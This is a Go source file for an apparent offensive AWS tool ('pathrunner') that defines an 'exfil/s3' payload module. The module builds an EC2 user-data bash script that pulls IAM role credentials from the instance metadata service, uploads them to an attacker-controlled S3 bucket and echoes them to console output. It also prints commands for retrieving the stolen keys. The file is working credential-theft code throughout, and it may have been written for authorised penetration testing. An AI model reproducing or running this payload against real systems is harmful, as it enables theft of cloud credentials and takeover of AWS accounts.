package ec2

import (
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

type ExfilS3Payload struct{}

func init() {
	payloads.Register(&ExfilS3Payload{})
}

func (p *ExfilS3Payload) GetName() string {
	return "exfil/s3"
}

func (p *ExfilS3Payload) GetDescription() string {
	return "Exfiltrate EC2 instance role credentials to an attacker-controlled S3 bucket via user-data"
}

func (p *ExfilS3Payload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueExfil,
		payloads.TagTransportFilesystem,
	}
}

func (p *ExfilS3Payload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "EXFIL_BUCKET",
			Description: "Attacker-controlled S3 bucket name for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "EXFIL_PREFIX",
			Description: "S3 key prefix for exfiltrated data",
			Required:    false,
			Default:     "exfil/",
		},
		{
			Name:        "INCLUDE_METADATA",
			Description: "Include instance metadata (hostname, region, etc.) in the exfiltrated payload",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *ExfilS3Payload) Validate(options map[string]string) error {
	bucket := options["EXFIL_BUCKET"]
	if bucket == "" {
		return fmt.Errorf("EXFIL_BUCKET is required for exfil/s3 payload")
	}
	if strings.HasPrefix(bucket, "s3://") {
		return fmt.Errorf("EXFIL_BUCKET should be the bucket name only, not an S3 URI")
	}
	return nil
}

func (p *ExfilS3Payload) GenerateCode(options map[string]string) (string, error) {
	exfilBucket := options["EXFIL_BUCKET"]
	exfilPrefix := options["EXFIL_PREFIX"]
	if exfilPrefix == "" {
		exfilPrefix = "exfil/"
	}
	includeMetadata := options["INCLUDE_METADATA"] != "false"

	metadataBlock := ""
	metadataJSON := ""
	if includeMetadata {
		metadataBlock = `
INSTANCE_ID=$(imds_get /latest/meta-data/instance-id)
HOSTNAME=$(imds_get /latest/meta-data/hostname)
REGION=$(imds_get /latest/meta-data/placement/region)
AZ=$(imds_get /latest/meta-data/placement/availability-zone)
`
		metadataJSON = `,
  "instance_id": "$INSTANCE_ID",
  "hostname": "$HOSTNAME",
  "region": "$REGION",
  "availability_zone": "$AZ",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"`
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-exfil-s3.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner S3 Credential Exfiltration Payload"
echo "Target Bucket: %s"
echo ""

sleep 15

%s
%s
ROLE_NAME=$(imds_get /latest/meta-data/iam/security-credentials/)

if [ -z "$ROLE_NAME" ]; then
    echo "ERROR: No IAM role attached to this instance"
    exit 1
fi

echo "Found role: $ROLE_NAME"

CREDENTIALS=$(imds_get /latest/meta-data/iam/security-credentials/$ROLE_NAME)

if [ -z "$CREDENTIALS" ]; then
    echo "ERROR: Could not retrieve credentials"
    exit 1
fi

echo "Credentials retrieved successfully"

AK_ID=$(echo "$CREDENTIALS" | grep -o '"AccessKeyId" *: *"[^"]*"' | cut -d'"' -f4)
AK_SECRET=$(echo "$CREDENTIALS" | grep -o '"SecretAccessKey" *: *"[^"]*"' | cut -d'"' -f4)
AK_TOKEN=$(echo "$CREDENTIALS" | grep -o '"Token" *: *"[^"]*"' | cut -d'"' -f4)

ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo "unknown")

PAYLOAD=$(cat <<PAYLOAD
{
  "type": "ec2_credential_exfil",
  "role_name": "$ROLE_NAME",
  "account_id": "$ACCOUNT_ID",
  "credentials": {
    "access_key_id": "$AK_ID",
    "secret_access_key": "$AK_SECRET",
    "session_token": "$AK_TOKEN"
  }%s
}
PAYLOAD
)

EXFIL_KEY="%s${ACCOUNT_ID}/$(date +%%s).json"

echo "Uploading credentials to s3://%s/${EXFIL_KEY}..."
echo "$PAYLOAD" | aws s3 cp - "s3://%s/${EXFIL_KEY}" --content-type "application/json" 2>&1

if [ $? -eq 0 ]; then
    echo "SUCCESS: Credentials written to s3://%s/${EXFIL_KEY}"
else
    echo "FAILED: Could not write to S3 bucket"
fi

echo "--- PATHFINDER_IDENTITY_DATA ---"
echo "NAME=ec2-role/$ROLE_NAME"
echo "TYPE=keys"
echo "ACCESS_KEY_ID=$AK_ID"
echo "SECRET_ACCESS_KEY=$AK_SECRET"
echo "SESSION_TOKEN=$AK_TOKEN"
echo "AUTO_SWITCH=false"
echo "--- END_PATHFINDER_IDENTITY_DATA ---"

echo "S3 exfiltration payload complete"
`, exfilBucket, IMDSHelperSnippet(), metadataBlock, metadataJSON, exfilPrefix, exfilBucket, exfilBucket, exfilBucket)

	return userDataScript, nil
}

func (p *ExfilS3Payload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== S3 Credential Exfiltration Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nThe EC2 instance will exfiltrate its role credentials to S3 on boot.\n")
	output.WriteString("Allow 2-3 minutes for the script to complete.\n\n")

	output.WriteString("To retrieve exfiltrated credentials:\n")
	output.WriteString("aws s3 ls s3://<EXFIL_BUCKET>/<EXFIL_PREFIX>\n")
	output.WriteString("aws s3 cp s3://<EXFIL_BUCKET>/<EXFIL_PREFIX><ACCOUNT_ID>/<TIMESTAMP>.json -\n\n")

	output.WriteString("Credentials are also in the instance console output for auto-import.\n")
	output.WriteString("To retrieve: aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")

	return output.String(), nil
}
